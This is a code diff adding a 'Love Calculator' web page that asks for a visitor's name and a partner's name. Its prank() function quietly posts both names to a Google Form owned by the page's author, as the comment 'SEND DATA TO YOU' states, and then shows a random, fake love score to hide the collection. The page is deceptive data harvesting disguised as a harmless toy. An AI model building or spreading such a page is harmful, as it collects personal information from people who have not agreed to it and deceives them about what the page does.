@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>💘 Love Calculator</title>
+  <style>
+    body {
+      font-family: Arial;
+      background: linear-gradient(135deg,#ff758c,#ff7eb3);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .box {
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      text-align: center;
+      width: 320px;
+    }
+    input, button {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 8px;
+    }
+    button {
+      background: #ff4d6d;
+      color: white;
+      border: none;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h2>💖 Love Calculator</h2>
+  <input id="user" placeholder="Your name">
+  <input id="partner" placeholder="Partner's name">
+  <button onclick="prank()">Calculate Love</button>
+  <p id="msg"></p>
+</div>
+
+<script>
+function prank() {
+  const user = document.getElementById("user").value;
+  const partner = document.getElementById("partner").value;
+
+  if (!user || !partner) {
+    alert("Fill both names 😅");
+    return;
+  }
+
+  // 👇 SEND DATA TO YOU (Google Form)
+  fetch("https://docs.google.com/forms/d/e/XXXX/formResponse", {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body:
+      "entry.123456789=" + encodeURIComponent(user) +
+      "&entry.987654321=" + encodeURIComponent(partner)
+  });
+
+  // Fake result
+  document.getElementById("msg").innerHTML =
+    "💞 Calculating chemistry...<br>❤️ Love Score: " +
+    (Math.floor(Math.random() * 30) + 70) + "% 😍";
+}
+</script>
+
+</body>
+</html>
